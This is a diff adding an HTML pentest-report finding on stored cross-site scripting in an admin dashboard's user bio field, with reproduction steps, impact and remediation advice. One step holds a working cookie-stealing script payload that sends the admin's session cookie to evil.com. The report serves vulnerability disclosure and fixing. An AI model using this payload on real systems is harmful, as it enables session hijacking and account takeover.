@@ -1,0 +1,65 @@
+<div class="finding" id="finding-1">
+  <div class="finding-header">
+    <h2 class="finding-title">Stored XSS in Admin Dashboard</h2>
+    <span class="severity critical">Critical</span>
+  </div>
+
+  <div class="finding-meta">
+    <table>
+      <tr><td><strong>CVSS Score</strong></td><td>9.8</td></tr>
+      <tr><td><strong>CWE</strong></td><td>CWE-79: Cross-site Scripting</td></tr>
+      <tr><td><strong>Host</strong></td><td>admin.example.com</td></tr>
+      <tr><td><strong>Port</strong></td><td>443</td></tr>
+      <tr><td><strong>Endpoint</strong></td><td><code>POST /api/users</code></td></tr>
+      <tr><td><strong>Parameter</strong></td><td><code>bio</code> field in user profile</td></tr>
+    </table>
+  </div>
+
+  <div class="finding-description">
+    <h3>Description</h3>
+    <p>The <code>bio</code> field in user profiles lacks input sanitization, allowing arbitrary HTML and JavaScript to be stored. When an administrator views the user list, the malicious payload executes in their browser context.</p>
+  </div>
+
+  <div class="finding-steps">
+    <h3>Reproduction Steps</h3>
+    <ol>
+      <li>Login as a regular user.</li>
+      <li>Navigate to <strong>Profile Settings</strong>.</li>
+      <li>In the <strong>Bio</strong> field, enter the following payload:
+        <pre><code>&lt;script&gt;document.location='https://evil.com/?c='+document.cookie&lt;/script&gt;</code></pre>
+      </li>
+      <li>Save the profile.</li>
+      <li>As an administrator, navigate to the user list at <code>/admin/users</code>.</li>
+      <li>The XSS payload fires, exfiltrating the admin's session cookie to the attacker-controlled domain.</li>
+    </ol>
+  </div>
+
+  <div class="finding-impact">
+    <h3>Impact</h3>
+    <p>Full administrator account takeover. An attacker can:</p>
+    <ul>
+      <li>Access all user data across the platform.</li>
+      <li>Modify system configuration.</li>
+      <li>Persist access via session hijacking or account modification.</li>
+    </ul>
+  </div>
+
+  <div class="finding-remediation">
+    <h3>Remediation</h3>
+    <ul>
+      <li>Implement server-side input validation and sanitization for all user-supplied fields.</li>
+      <li>Apply Context-Aware Output Encoding (CWE-116) when rendering user content in HTML.</li>
+      <li>Enforce a Content Security Policy (CSP) to mitigate script execution.</li>
+      <li>Use <code>HttpOnly</code> and <code>Secure</code> flags on session cookies.</li>
+    </ul>
+  </div>
+
+  <div class="finding-references">
+    <h3>References</h3>
+    <ul>
+      <li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Cross-site Scripting</a></li>
+      <li><a href="https://owasp.org/www-community/attacks/xss/">OWASP XSS Attack</a></li>
+      <li><a href="https://portswigger.net/web-security/cross-site-scripting/stored">PortSwigger: Stored XSS</a></li>
+    </ul>
+  </div>
+</div>
